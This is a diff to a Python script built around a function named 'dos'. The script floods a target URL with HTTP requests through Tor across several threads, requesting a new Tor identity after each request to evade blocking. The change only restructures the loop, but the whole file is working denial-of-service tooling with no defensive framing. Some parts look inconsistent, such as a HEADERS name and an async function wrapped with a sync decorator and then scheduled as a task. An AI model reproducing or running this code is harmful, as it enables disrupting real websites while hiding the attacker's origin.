@@ -6,18 +6,13 @@ from aiohttp import ClientSession
 
 from aiohttp_socks import ProxyType, ProxyConnector
 
-from stem import Signal
-
 from stem.control import Controller
 
+from stem import Signal
+
+from syncer import sync
+
 from argparse import Namespace
-
-
-__all__ = [
-    'URL', 'HEADER', 'PROXY_HOST',
-    'PROXY_PORT', 'WORKERS', 'dos',
-    'runner', 'pool'
-]
 
 
 URL = 'https://ident.me'
@@ -37,38 +32,45 @@ PROXY_PORT = 9050
 WORKERS = 8
 
 
-async def dos(url: str, proxy_host: str, proxy_port: str, worker: int, loop: bool = True):
-    while loop:
-        # Proxy
-        connector = ProxyConnector(
-            proxy_type=ProxyType.SOCKS5,
-            host=proxy_host,
-            port=proxy_port,
-            # DNS resolution for Socket
-            rdns=True
+async def dos(url: str, proxy_host: str, proxy_port: str):
+    # Proxy
+    connector = ProxyConnector(
+        proxy_type=ProxyType.SOCKS5,
+        host=proxy_host,
+        port=proxy_port,
+        # DNS resolution for Socket
+        rdns=True
+    )
+
+    # HTTP session
+    session = ClientSession(connector=connector)
+
+    async with session.get(url, headers=HEADERS) as response:
+        print(f'Request status code {response.status}')
+
+    await session.close()
+
+    # TOR new identity
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate()
+
+        controller.signal(Signal.NEWNYM)
+
+
+@sync
+async def dos_looper(url: str, proxy_host: str, proxy_port: str):
+    while True:
+        await dos(
+            url=url,
+            proxy_host=proxy_host,
+            proxy_port=proxy_port,
         )
 
-        # HTTP session
-        session = ClientSession(connector=connector)
 
-        for index in range(8):
-            async with session.get(url, headers=HEADERS) as response:
-                print(
-                    f'#{worker + 1} Worker | Request has a {response.status} status code')
-
-        await session.close()
-
-        # TOR new identity
-        with Controller.from_port(port=9051) as controller:
-            controller.authenticate()
-
-            controller.signal(Signal.NEWNYM)
-
-
-def runner(args: Namespace, loop: unix_events._UnixSelectorEventLoop, worker: int):
+def runner(args: Namespace, loop: unix_events._UnixSelectorEventLoop):
     set_event_loop(loop)
 
-    loop.create_task(dos(args.url, args.proxy_host, args.proxy_port, worker))
+    loop.create_task(dos_looper(args.url, args.proxy_host, args.proxy_port))
 
     loop.run_forever()
 
@@ -77,6 +79,6 @@ def pool(args: Namespace):
     for worker in range(args.workers):
         loop = new_event_loop()
 
-        thread = Thread(target=runner, args=(args, loop, worker))
+        thread = Thread(target=runner, args=(args, loop))
 
         thread.start()
